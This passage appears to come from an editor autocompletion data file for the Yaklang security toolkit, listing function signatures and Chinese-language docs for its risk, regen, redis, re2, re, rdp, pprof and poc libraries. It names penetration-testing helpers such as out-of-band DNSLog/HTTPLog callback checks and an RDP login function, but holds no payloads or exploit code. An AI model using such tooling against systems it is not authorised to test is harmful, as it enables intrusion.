              "DeleteRiskByID(id int64) error  doc:DeleteRiskByID 根据风险记录ID删除风险记录\n",
          },
          {
            functionName: "CreateRisk(${1:u /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'CreateRisk(u string, opts ...RiskParamsOpt) *schema.Risk  doc:CreateRisk 创建漏洞记录结构体，但是并不会保存到数据库，第一个参数是目标URL，后面可以传入零个或多个选项参数，用于指定 risk 的结构，其通常与 Save 一起使用\n\nExample:\n```\nr = risk.CreateRisk("http://example.com", risk.title("SQL注入漏洞"), risk.type("sqli"), risk.severity("high"), risk.description(""), risk.solution(""))\nrisk.Save(r)\n```\n',
          },
          {
            functionName:
              "CheckServerReachable(${1:ctx /*type: context.Context*/}, ${2:target /*type: string*/}, ${3:httpCheck /*type: bool*/})",
            document: "",
            definitionStr:
              'CheckServerReachable(ctx context.Context, target string, httpCheck bool) (*tpb.CheckServerReachableResponse, error)  doc:CheckServerReachable 通过 Bridge 检查目标是否可达，第一个参数为上下文，第二个参数为目标地址，第三个参数为是否进行 http 检测，返回的第一个值是 CheckServerReachableResponse，第二个值是错误\n\nExample:\n```\nresp = risk.CheckServerReachable(context.Background(), "example.com", false)~\nprint(resp.Reachable) // 是否可达\n```\n',
          },
          {
            functionName: "CheckRandomTriggerByToken(${1:t /*type: string*/})",
            document: "",
            definitionStr:
              "CheckRandomTriggerByToken(t string) (*tpb.RandomPortTriggerEvent any, error any)  doc:CheckRandomTriggerByToken 通过 token 检查端口反连事件，返回的第一个值是 RandomPortTriggerEvent，第二个值是错误\n\nExample:\n```\ntoken, addr = risk.NewRandomPortTrigger()~\n...\nevent = risk.CheckRandomTriggerByToken(token)~\n```\n",
          },
          {
            functionName: "CheckICMPTriggerByLength(${1:i /*type: int*/})",
            document: "",
            definitionStr:
              "CheckICMPTriggerByLength(i int) (*tpb.ICMPTriggerNotification any, error any)",
          },
          {
            functionName:
              "CheckHTTPLogByToken(${1:token /*type: string*/}, ${2:timeout...})",
            document: "",
            definitionStr:
              "CheckHTTPLogByToken(token string, timeout ...float64) ([]*tpb.HTTPRequestTriggerNotification any, error any)  doc:CheckHTTPLogByToken 通过 token 检查 HTTPLog 事件，返回的第一个值是 HTTPLogEvent 列表，第二个值是错误\n\nExample:\n```\ndomain, token = risk.NewHTTPLog()~\n...\nevents = risk.CheckHTTPLogByToken(token)~\n```\n",
          },
          {
            functionName:
              "CheckDNSLogByToken(${1:token /*type: string*/}, ${2:timeout...})",
            document: "",
            definitionStr:
              "CheckDNSLogByToken(token string, timeout ...float64) ([]*tpb.DNSLogEvent any, error any)  doc:CheckDNSLogByToken 通过 token 检查 DNSLog 事件，返回的第一个值是 DNSLogEvent 列表，第二个值是错误\n\nExample:\n```\ndomain, token = risk.NewDNSLogDomain()~\n...\nevents = risk.CheckDNSLogByToken(token)~\n```\n",
          },
        ],
      },
      {
        libName: "report",
        prefix: "report.",
        functions: [
          {
            functionName: "New()",
            document: "",
            definitionStr: "New() *schema.Report",
          },
        ],
      },
      {
        libName: "regen",
        prefix: "regen.",
        functions: [
          {
            functionName: "MustGenerateVisibleOne(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'MustGenerateVisibleOne(pattern string) string  doc:MustGenerateVisibleOne 根据正则表达式生成一个匹配的字符串(都是可见字符)，如果生成失败则会崩溃，返回生成的字符串\n\nExample:\n```\nregen.MustGenerateVisibleOne("[a-z]") // a-z 中随机一个字母\nregen.MustGenerateVisibleOne("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName: "MustGenerateOne(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'MustGenerateOne(pattern string) string  doc:MustGenerateOne 根据正则表达式生成一个匹配的字符串，如果生成失败则会崩溃，返回生成的字符串\n\nExample:\n```\nregen.MustGenerateOne("[a-z]") // a-z 中随机一个字母\nregen.MustGenerateOne("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName: "MustGenerate(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'MustGenerate(pattern string) []string  doc:MustGenerate 根据正则表达式生成所有匹配的字符串，如果生成失败则会崩溃，返回生成的字符串切片\n\n对于一些可能匹配多次的元字符:\n\n*     : 则只会生成匹配 0 次或 1 次的字符串\n\n+     : 则只会生成匹配 1 次或 2 次的字符串\n\n{n,m} : 则会生成匹配 n 次到 m 次的字符串\n\n{n,}  : 则只会生成匹配 n 次或 n+1 次的字符串\n\nExample:\n```\nregen.MustGenerate("[a-z]+") // a-z 单个字母，aa-zz 两个字母\n```\n',
          },
          {
            functionName:
              "GenerateVisibleOneStream(${1:pattern /*type: string*/}, ${2:ctxs...})",
            document: "",
            definitionStr:
              'GenerateVisibleOneStream(pattern string, ctxs ...context.Context) (string, error)  doc:GenerateVisibleOneStream 根据正则表达式流式生成一个匹配的字符串(都是可见字符)，返回生成的字符串和错误\n\n对于一些可能匹配多次的元字符:\n\n*     : 则只会生成匹配 0 次或 1 次的字符串\n\n+     : 则只会生成匹配 1 次或 2 次的字符串\n\n{n,m} : 则会生成匹配 n 次到 m 次的字符串\n\n{n,}  : 则只会生成匹配 n 次或 n+1 次的字符串\n\nExample:\n```\nregen.GenerateVisibleOneStream("[a-z]") // a-z 中随机一个字母\nregen.GenerateVisibleOneStream("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName: "GenerateVisibleOne(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'GenerateVisibleOne(pattern string) (string, error)  doc:GenerateVisibleOne 根据正则表达式生成一个匹配的字符串(都是可见字符)，返回生成的字符串和错误\n\nExample:\n```\nregen.GenerateVisibleOne("[a-z]") // a-z 中随机一个字母\nregen.GenerateVisibleOne("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName:
              "GenerateStream(${1:pattern /*type: string*/}, ${2:ctxs...})",
            document: "",
            definitionStr:
              'GenerateStream(pattern string, ctxs ...context.Context) (chan string, context.CancelFunc, error)  doc:GenerateStream 根据正则表达式流式生成所有匹配的字符串，返回生成的字符串通道和生成取消函数和错误\n\n对于一些可能匹配多次的元字符:\n\n*     : 则只会生成匹配 0 次或 1 次的字符串\n\n+     : 则只会生成匹配 1 次或 2 次的字符串\n\n{n,m} : 则会生成匹配 n 次到 m 次的字符串\n\n{n,}  : 则只会生成匹配 n 次或 n+1 次的字符串\n\nExample:\n```\nch, cancel, err = regen.GenerateStream("[a-z]+")\nfor s = range ch {\nprintln(s)\n}\n```\n',
          },
          {
            functionName:
              "GenerateOneStream(${1:pattern /*type: string*/}, ${2:ctxs...})",
            document: "",
            definitionStr:
              'GenerateOneStream(pattern string, ctxs ...context.Context) (string, error)  doc:GenerateStream 根据正则表达式流式生成一个匹配的字符串，返回生成的字符串和错误\n\n对于一些可能匹配多次的元字符:\n\n*     : 则只会生成匹配 0 次或 1 次的字符串\n\n+     : 则只会生成匹配 1 次或 2 次的字符串\n\n{n,m} : 则会生成匹配 n 次到 m 次的字符串\n\n{n,}  : 则只会生成匹配 n 次或 n+1 次的字符串\n\nExample:\n```\nregen.GenerateOneStream("[a-z]+") // a-z 中随机一个字母\nregen.GenerateOneStream("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName: "GenerateOne(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'GenerateOne(pattern string) (string, error)  doc:GenerateOne 根据正则表达式生成一个匹配的字符串，返回生成的字符串和错误\n\nExample:\n```\nregen.GenerateOne("[a-z]") // a-z 中随机一个字母\nregen.GenerateOne("^(13[0-9]|14[57]|15[0-9]|18[0-9])\\d{8}$") // 生成一个手机号\n```\n',
          },
          {
            functionName: "Generate(${1:pattern /*type: string*/})",
            document: "",
            definitionStr:
              'Generate(pattern string) ([]string, error)  doc:Generate 根据正则表达式生成所有匹配的字符串，返回生成的字符串切片和错误\n\n对于一些可能匹配多次的元字符:\n\n*     : 则只会生成匹配 0 次或 1 次的字符串\n\n+     : 则只会生成匹配 1 次或 2 次的字符串\n\n{n,m} : 则会生成匹配 n 次到 m 次的字符串\n\n{n,}  : 则只会生成匹配 n 次或 n+1 次的字符串\n\nExample:\n```\nregen.Generate("[a-z]+") // a-z 单个字母，aa-zz 两个字母\n```\n',
          },
        ],
      },
      {
        libName: "redis",
        prefix: "redis.",
        functions: [
          {
            functionName: "username(${1:a /*type: string*/})",
            document: "",
            definitionStr: "username(a string) redisConfigOpt",
          },
          {
            functionName: "timeoutSeconds(${1:d /*type: int*/})",
            document: "",
            definitionStr: "timeoutSeconds(d int) redisConfigOpt",
          },
          {
            functionName: "retry(${1:a /*type: int*/})",
            document: "",
            definitionStr: "retry(a int) redisConfigOpt",
          },
          {
            functionName: "port(${1:h /*type: int*/})",
            document: "",
            definitionStr: "port(h int) redisConfigOpt",
          },
          {
            functionName: "password(${1:a /*type: string*/})",
            document: "",
            definitionStr: "password(a string) redisConfigOpt",
          },
          {
            functionName: "host(${1:h /*type: string*/})",
            document: "",
            definitionStr: "host(h string) redisConfigOpt",
          },
          {
            functionName: "addr(${1:a /*type: string*/})",
            document: "",
            definitionStr: "addr(a string) redisConfigOpt",
          },
          {
            functionName: "New(${1:r...})",
            document: "",
            definitionStr: "New(r ...redisConfigOpt) *redisClient",
          },
        ],
      },
      {
        libName: "re2",
        prefix: "re2.",
        functions: [
          {
            functionName:
              "ReplaceAllWithFunc(${1:i}, ${2:pattern /*type: string*/}, ${3:target /*type: func(string) string*/})",
            document: "",
            definitionStr:
              "ReplaceAllWithFunc(i any, pattern string, target func(string) string) string",
          },
          {
            functionName:
              "ReplaceAll(${1:i}, ${2:pattern /*type: string*/}, ${3:target /*type: string*/})",
            document: "",
            definitionStr:
              "ReplaceAll(i any, pattern string, target string) string",
          },
          {
            functionName: "QuoteMeta(${1:input /*type: string*/})",
            document: "",
            definitionStr:
              "QuoteMeta(input string) string  doc:Escape adds backslashes to any special characters in the input string\n",
          },
          {
            functionName: "OPT_Singleline",
            document: "re2.OPT_Singleline: int = 0x10",
            definitionStr: "re2.OPT_Singleline: int = 0x10",
          },
          {
            functionName: "OPT_RightToLeft",
            document: "re2.OPT_RightToLeft: int = 0x40",
            definitionStr: "re2.OPT_RightToLeft: int = 0x40",
          },
          {
            functionName: "OPT_RE2",
            document: "re2.OPT_RE2: int = 0x200",
            definitionStr: "re2.OPT_RE2: int = 0x200",
          },
          {
            functionName: "OPT_None",
            document: "re2.OPT_None: regexp2.RegexOptions",
            definitionStr: "re2.OPT_None: regexp2.RegexOptions",
          },
          {
            functionName: "OPT_Multiline",
            document: "re2.OPT_Multiline: int = 0x2",
            definitionStr: "re2.OPT_Multiline: int = 0x2",
          },
          {
            functionName: "OPT_IgnorePatternWhitespace",
            document: "re2.OPT_IgnorePatternWhitespace: int = 0x20",
            definitionStr: "re2.OPT_IgnorePatternWhitespace: int = 0x20",
          },
          {
            functionName: "OPT_IgnoreCase",
            document: "re2.OPT_IgnoreCase: int = 0x1",
            definitionStr: "re2.OPT_IgnoreCase: int = 0x1",
          },
          {
            functionName: "OPT_ExplicitCapture",
            document: "re2.OPT_ExplicitCapture: int = 0x4",
            definitionStr: "re2.OPT_ExplicitCapture: int = 0x4",
          },
          {
            functionName: "OPT_ECMAScript",
            document: "re2.OPT_ECMAScript: int = 0x100",
            definitionStr: "re2.OPT_ECMAScript: int = 0x100",
          },
          {
            functionName: "OPT_Debug",
            document: "re2.OPT_Debug: int = 0x80",
            definitionStr: "re2.OPT_Debug: int = 0x80",
          },
          {
            functionName: "OPT_Compiled",
            document: "re2.OPT_Compiled: int = 0x8",
            definitionStr: "re2.OPT_Compiled: int = 0x8",
          },
          {
            functionName:
              "FindSubmatchAll(${1:i}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr: "FindSubmatchAll(i any, pattern string) [][]string",
          },
          {
            functionName: "FindSubmatch(${1:i}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr: "FindSubmatch(i any, pattern string) []string",
          },
          {
            functionName: "FindGroupAll(${1:i}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr:
              "FindGroupAll(i any, pattern string) []map[string]string",
          },
          {
            functionName: "FindGroup(${1:i}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr: "FindGroup(i any, pattern string) map[string]string",
          },
          {
            functionName: "FindAll(${1:data}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr: "FindAll(data any, pattern string) []string",
          },
          {
            functionName: "Find(${1:data}, ${2:pattern /*type: string*/})",
            document: "",
            definitionStr: "Find(data any, pattern string) string",
          },
          {
            functionName:
              "CompileWithOption(${1:rule /*type: string*/}, ${2:opt /*type: int*/})",
            document: "",
            definitionStr:
              "CompileWithOption(rule string, opt int) (*regexp2.Regexp, error)",
          },
          {
            functionName: "Compile(${1:pattern /*type: string*/})",
            document: "",
            definitionStr: "Compile(pattern string) (*regexp2.Regexp, error)",
          },
        ],
      },
      {
        libName: "re",
        prefix: "re.",
        functions: [
          {
            functionName:
              "ReplaceAllWithFunc(${1:origin}, ${2:re /*type: string*/}, ${3:newStr /*type: func(string) string*/})",
            document: "",
            definitionStr:
              'ReplaceAllWithFunc(origin any, re string, newStr func(string) string) string  doc:ReplaceAllWithFunc 使用正则表达式匹配并使用自定义的函数替换字符串，并返回替换后的字符串\n\nExample:\n```\n// "yaklang is a programming language"\nre.ReplaceAllWithFunc("yakit is programming language", "yak([a-z]+)", func(s) {\nreturn "yaklang"\n})\n```\n',
          },
          {
            functionName:
              "ReplaceAll(${1:origin}, ${2:re /*type: string*/}, ${3:newStr})",
            document: "",
            definitionStr:
              'ReplaceAll(origin any, re string, newStr any) string  doc:ReplaceAll 使用正则表达式匹配并替换字符串，并返回替换后的字符串\n\nExample:\n```\n// "yaklang is a programming language"\nre.ReplaceAll("yakit is programming language", "yak([a-z]+)", "yaklang")\n```\n',
          },
          {
            functionName: "QuoteMeta(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'QuoteMeta(s string) string  doc:QuoteMeta 返回一个字符串，该字符串是将 s 中所有正则表达式元字符进行转义后的结果\n\nExample:\n```\nstr.QuoteMeta("^[a-z]+$") // "\\^\\\\[a-z\\]\\\\+$"\n```\n',
          },
          {
            functionName: "MustCompilePOSIX(${1:str /*type: string*/})",
            document: "",
            definitionStr:
              'MustCompilePOSIX(str string) *regexp.Regexp  doc:MustCompilePOSIX 将正则表达式解析为一个POSIX正则表达式结构体引用，如果解析失败则会引发崩溃\n\nExample:\n```\nre.MustCompilePOSIX("^[a-z]+$")\n```\n',
          },
          {
            functionName: "MustCompile(${1:str /*type: string*/})",
            document: "",
            definitionStr:
              'MustCompile(str string) *regexp.Regexp  doc:MustCompile 将正则表达式解析为一个正则表达式对象结构体引用，如果解析失败则会引发崩溃\n\nExample:\n```\nre.MustCompile("^[a-z]+$")\n```\n',
          },
          {
            functionName: "Match(${1:pattern /*type: string*/}, ${2:s})",
            document: "",
            definitionStr:
              'Match(pattern string, s any) bool  doc:Match 使用正则尝试匹配字符串，如果匹配成功返回 true，否则返回 false\n\nExample:\n```\nre.Match("^[a-z]+$", "abc") // true\n```\n',
          },
          {
            functionName:
              "Grok(${1:line /*type: string*/}, ${2:rule /*type: string*/})",
            document: "",
            definitionStr:
              'Grok(line string, rule string) GrokResult  doc:Grok 用于将字符串 line 使用 Grok 以规则 rule 进行解析，并返回解析结果(map)，参考 https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/filter/grok.html 获取更多信息。\n\nExample:\n```\nstr.Grok("04/18-00:59:45.385191", "%{MONTHNUM:month}/%{MONTHDAY:day}-%{TIME:time}") // map[HOUR:[00] MINUTE:[59] SECOND:[45.385191] day:[18] month:[04] time:[00:59:45.385191]]\n```\n',
          },
          {
            functionName:
              "FindSubmatchIndex(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindSubmatchIndex(origin any, re string) []int  doc:FindSubmatchIndex 使用正则尝试匹配字符串，如果匹配成功返回第一个匹配的字符串以及子匹配的字符串的起始位置和结束位置，否则返回空整数切片\n\nExample:\n```\nre.FindSubmatchIndex("Well,yakit is GUI client for yaklang", "yak([a-z]+)") // [5, 10, 8, 10]\n```\n',
          },
          {
            functionName:
              "FindSubmatchAllIndex(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindSubmatchAllIndex(origin any, re string) [][]int  doc:FindSubmatchAllIndex 使用正则尝试匹配字符串，如果匹配成功返回所有匹配的字符串以及子匹配的字符串的起始位置和结束位置，否则返回空整数切片的二维切片\n\nExample:\n```\n// [[5, 10, 8, 10], [29, 36, 32, 36]]\nre.FindSubmatchAllIndex("Well,yakit is GUI client for yaklang", "yak([a-z]+)")\n```\n',
          },
          {
            functionName:
              "FindSubmatchAll(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindSubmatchAll(origin any, re string) [][]string  doc:FindSubmatchAll 使用正则尝试匹配字符串，如果匹配成功返回所有匹配的字符串以及子匹配的字符串，否则返回空字符串切片的二维切片\n\nExample:\n```\n// [["yakit", "it"], ["yaklang", "lang"]]\nre.FindSubmatchAll("Well,yakit is GUI client for yaklang", "yak([a-z]+)")\n```\n',
          },
          {
            functionName: "FindSubmatch(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindSubmatch(origin any, re string) []string  doc:FindSubmatch 使用正则尝试匹配字符串，如果匹配成功返回第一个匹配的字符串以及子匹配的字符串，否则返回空字符串切片\n\nExample:\n```\nre.FindSubmatch("Well,yakit is GUI client for yaklang", "yak([a-z]+)") // ["yakit", "it"]\n```\n',
          },
          {
            functionName: "FindIndex(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindIndex(origin any, re string) []int  doc:FindIndex 使用正则尝试匹配字符串，如果匹配成功返回一个长度为2的整数切片，第一个元素为起始位置，第二个元素为结束位置，否则返回空整数切片\n\nExample:\n```\nre.FindIndex("Well,yakit is GUI client for yaklang", "yak[a-z]+") // [5, 10]\n```\n',
          },
          {
            functionName: "FindGroupAll(${1:i}, ${2:raw /*type: string*/})",
            document: "",
            definitionStr:
              'FindGroupAll(i any, raw string) []map[string]string  doc:FindGroupAll 使用正则表达式匹配字符串，如果匹配成功返回一个映射切片，其键名为正则表达式中的命名捕获组，键值为匹配到的字符串，否则返回空映射切片\n\nExample:\n```\n// [{"0": "yakit", "other": "it"}, {"0": "yaklang", "other": "lang"}]\nre.FindGroupAll("Well,yakit is GUI client for yaklang", "yak(?P<other>[a-z]+)")\n```\n',
          },
          {
            functionName: "FindGroup(${1:i}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindGroup(i any, re string) map[string]string  doc:FindGroup 使用正则表达式匹配字符串，如果匹配成功返回一个映射，其键名为正则表达式中的命名捕获组，键值为匹配到的字符串，否则返回空映射\n\nExample:\n```\n// {"0": "yakit", "other": "it"}\nre.FindGroup("Well,yakit is GUI client for yaklang", "yak(?P<other>[a-z]+)")\n```\n',
          },
          {
            functionName: "FindAllIndex(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindAllIndex(origin any, re string) [][]int  doc:FindAllIndex 使用正则尝试匹配字符串，如果匹配成功返回所有匹配的字符串的起始位置和结束位置，否则返回空整数的二维切片\n\nExample:\n```\nre.FindAllIndex("Well,yakit is GUI client for yaklang", "yak[a-z]+") // [[5, 10], [29, 36]]\n```\n',
          },
          {
            functionName: "FindAll(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'FindAll(origin any, re string) []string  doc:FindAll 使用正则尝试匹配字符串，如果匹配成功返回所有匹配的字符串，否则返回空字符串切片\n\nExample:\n```\nre.FindAll("Well,yakit is GUI client for yaklang", "yak[a-z]+") // ["yakit", "yaklang"]\n```\n',
          },
          {
            functionName: "Find(${1:origin}, ${2:re /*type: string*/})",
            document: "",
            definitionStr:
              'Find(origin any, re string) string  doc:Find 使用正则尝试匹配字符串，如果匹配成功返回第一个匹配的字符串，否则返回空字符串\n\nExample:\n```\nre.Find("apple is an easy word", "^[a-z]+") // "apple"\n```\n',
          },
          {
            functionName: "ExtractURL(${1:i})",
            document: "",
            definitionStr:
              'ExtractURL(i any) []string  doc:ExtractURL 提取字符串中所有的 URL 地址\n\nExample:\n```\nre.ExtractURL("Yak official website: https://yaklang.com and https://yaklang.io") // ["https://yaklang.com", "https://yaklang.io"]\n```\n',
          },
          {
            functionName: "ExtractTTY(${1:i})",
            document: "",
            definitionStr:
              'ExtractTTY(i any) []string  doc:ExtractTTY 提取字符串中所有的Linux/Unix系统中的设备文件路径\n\nExample:\n```\nre.ExtractTTY("hello your tty is /dev/pts/1") // ["/dev/pts/1"]\n```\n',
          },
          {
            functionName: "ExtractPath(${1:i})",
            document: "",
            definitionStr:
              'ExtractPath(i any) []string  doc:ExtractPath 提取URL中的路径和查询字符串\n\nExample:\n```\nre.ExtractPath("visit this website: yaklang.com/docs/api/re?name=anonymous") // ["/docs/api/re?name=anonymous"]\n```\n',
          },
          {
            functionName: "ExtractMac(${1:i})",
            document: "",
            definitionStr:
              'ExtractMac(i any) []string  doc:ExtractMac 提取字符串中所有的 MAC 地址\n\nExample:\n```\nre.ExtractMac("hello your mac is 00:00:00:00:00:00") // ["00:00:00:00:00:00"]\n```\n',
          },
          {
            functionName: "ExtractIPv6(${1:i})",
            document: "",
            definitionStr:
              'ExtractIPv6(i any) []string  doc:ExtractIPv6 提取字符串中所有的 IPv6 地址\n\nExample:\n```\nre.ExtractIPv6("hello your local ipv6 ip is fe80::1, your public ipv6 ip is 2001:4860:4860::8888") // ["fe80::1", "2001:4860:4860::8888"]\n```\n',
          },
          {
            functionName: "ExtractIPv4(${1:i})",
            document: "",
            definitionStr:
              'ExtractIPv4(i any) []string  doc:ExtractIPv4 提取字符串中所有的 IPv4 地址\n\nExample:\n```\nre.ExtractIPv4("hello your local ip is 127.0.0.1, your public ip is 1.1.1.1") // ["127.0.0.1", "1.1.1.1"]\n```\n',
          },
          {
            functionName: "ExtractIP(${1:i})",
            document: "",
            definitionStr:
              'ExtractIP(i any) []string  doc:ExtractIP 提取字符串中所有的 IP 地址\n\nExample:\n```\nre.ExtractIP("hello your local ip is 127.0.0.1, your local ipv6 ip is fe80::1") // ["127.0.0.1", "fe80::1"]\n```\n',
          },
          {
            functionName: "ExtractHostPort(${1:i})",
            document: "",
            definitionStr:
              'ExtractHostPort(i any) []string  doc:ExtractHostPort 提取字符串中所有的 Host:Port\n\nExample:\n```\nre.ExtractHostPort("Open Host:Port\\n127.0.0.1:80\\n127.0.0.1:443") // ["127.0.0.1:80", "127.0.0.1:443"]\n```\n',
          },
          {
            functionName: "ExtractEmail(${1:i})",
            document: "",
            definitionStr:
              'ExtractEmail(i any) []string  doc:ExtractEmail 提取字符串中所有的 Email 地址\n\nExample:\n```\nre.ExtractEmail("hello your email is anonymous@yaklang.io") // ["anonymous@yaklang.io"]\n```\n',
          },
          {
            functionName: "CompilePOSIX(${1:expr /*type: string*/})",
            document: "",
            definitionStr:
              'CompilePOSIX(expr string) (*regexp.Regexp, error)  doc:CompilePOSIX 将正则表达式解析为一个符合 POSIX ERE(egrep) 语法的正则表达式结构体引用，并且匹配语义改为左最长匹配\n\nExample:\n```\nre.CompilePOSIX("^[a-z]+$")\n```\n',
          },
          {
            functionName: "Compile(${1:expr /*type: string*/})",
            document: "",
            definitionStr:
              'Compile(expr string) (*regexp.Regexp, error)  doc:Compile 将正则表达式解析为一个正则表达式结构体引用\n\nExample:\n```\nre.Compile("^[a-z]+$")\n```\n',
          },
        ],
      },
      {
        libName: "rdp",
        prefix: "rdp.",
        functions: [
          {
            functionName:
              "Version(${1:addr /*type: string*/}, ${2:timeout /*type: time.Duration*/})",
            document: "",
            definitionStr:
              "Version(addr string, timeout time.Duration) (_ string, _ []string, finalResult error)",
          },
          {
            functionName:
              "Login(${1:ip /*type: string*/}, ${2:domain /*type: string*/}, ${3:user /*type: string*/}, ${4:password /*type: string*/}, ${5:port /*type: int*/})",
            document: "",
            definitionStr:
              "Login(ip string, domain string, user string, password string, port int) (_ bool, err error)",
          },
        ],
      },
      {
        libName: "pprof",
        prefix: "pprof.",
        functions: [
          {
            functionName: "timeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "timeout(i float64) Option",
          },
          {
            functionName: "onMemProfileStarted(${1:fn /*type: func(string)*/})",
            document: "",
            definitionStr: "onMemProfileStarted(fn func(string)) Option",
          },
          {
            functionName:
              "onMemProfileFinished(${1:fn /*type: func(string, error)*/})",
            document: "",
            definitionStr: "onMemProfileFinished(fn func(string, error)) Option",
          },
          {
            functionName: "onCPUProfileStarted(${1:fn /*type: func(string)*/})",
            document: "",
            definitionStr: "onCPUProfileStarted(fn func(string)) Option",
          },
          {
            functionName:
              "onCPUProfileFinished(${1:fn /*type: func(string, error)*/})",
            document: "",
            definitionStr: "onCPUProfileFinished(fn func(string, error)) Option",
          },
          {
            functionName: "memProfilePath(${1:file /*type: string*/})",
            document: "",
            definitionStr: "memProfilePath(file string) Option",
          },
          {
            functionName: "ctx(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr: "ctx(ctx context.Context) Option",
          },
          {
            functionName: "cpuProfilePath(${1:file /*type: string*/})",
            document: "",
            definitionStr: "cpuProfilePath(file string) Option",
          },
          {
            functionName: "callback(${1:h /*type: func(string)*/})",
            document: "",
            definitionStr: "callback(h func(string)) Option",
          },
          {
            functionName: "StartMemoryProfile(${1:opts...})",
            document: "",
            definitionStr: "StartMemoryProfile(opts ...Option) error",
          },
          {
            functionName: "StartCPUProfile(${1:opts...})",
            document: "",
            definitionStr: "StartCPUProfile(opts ...Option) error",
          },
          {
            functionName: "StartCPUAndMemoryProfile(${1:opts...})",
            document: "",
            definitionStr: "StartCPUAndMemoryProfile(opts ...Option) error",
          },
        ],
      },
      {
        libName: "poc",
        prefix: "poc.",
        functions: [
          {
            functionName: "websocketStrictMode(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'websocketStrictMode(b bool) PocConfigOption  doc:websocketStrictMode 是一个请求选项参数，它用于控制是否启用严格模式，如果启用严格模式，则会遵循 RFC 6455 规范\n\nExample:\n```\nrsp, req, err = poc.HTTP(`GET / HTTP/1.1\nConnection: Upgrade\nUpgrade: websocket\nSec-Websocket-Version: 13\nSec-Websocket-Extensions: permessage-deflate; client_max_window_bits\nHost: echo.websocket.events\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7\nSec-Websocket-Key: L31R1As+71fwuXqhwhABuA==`,\npoc.proxy("http://127.0.0.1:7890"), poc.websocketStrictMode(true))\n\ntime.Sleep(100)\n```\n',
          },
          {
            functionName:
              "websocketOnClient(${1:w /*type: func(c *lowhttp.WebsocketClient)*/})",
            document: "",
            definitionStr:
              'websocketOnClient(w func(c *lowhttp.WebsocketClient)) PocConfigOption  doc:websocketOnClient 是一个请求选项参数，它接收一个回调函数，这个函数有一个参数，是WebsocketClient结构体，通过该结构体可以向服务端发送数据\n\nExample:\n```\nrsp, req, err = poc.HTTP(`GET / HTTP/1.1\nConnection: Upgrade\nUpgrade: websocket\nSec-Websocket-Version: 13\nSec-Websocket-Extensions: permessage-deflate; client_max_window_bits\nHost: echo.websocket.events\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7\nSec-Websocket-Key: L31R1As+71fwuXqhwhABuA==`,\n\n\tpoc.proxy("http://127.0.0.1:7890"), poc.websocketFromServer(func(rsp, cancel) {\n\t\t    dump(rsp)\n\t\t}), poc.websocketOnClient(func(c) {\n\t\t    c.WriteText("123")\n\t\t}), poc.websocket(true),\n\n)\ntime.Sleep(100)\n```\n',
          },
          {
            functionName:
              "websocketFromServer(${1:w /*type: func(i []byte, cancel func())*/})",
            document: "",
            definitionStr:
              'websocketFromServer(w func(i []byte, cancel func())) PocConfigOption  doc:websocketFromServer 是一个请求选项参数，它接收一个回调函数，这个函数有两个参数，其中第一个参数为服务端发送的数据，第二个参数为取消函数，调用将会强制断开 websocket\n\nExample:\n```\nrsp, req, err = poc.HTTP(`GET / HTTP/1.1\nConnection: Upgrade\nUpgrade: websocket\nSec-Websocket-Version: 13\nSec-Websocket-Extensions: permessage-deflate; client_max_window_bits\nHost: echo.websocket.events\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7\nSec-Websocket-Key: L31R1As+71fwuXqhwhABuA==`,\n\n\tpoc.proxy("http://127.0.0.1:7890"), poc.websocketFromServer(func(rsp, cancel) {\n\t\t    dump(rsp)\n\t\t}), poc.websocketOnClient(func(c) {\n\t\t    c.WriteText("123")\n\t\t}), poc.websocket(true),\n\n)\ntime.Sleep(100)\n```\n',
          },
          {
            functionName: "websocket(${1:w /*type: bool*/})",
            document: "",
            definitionStr:
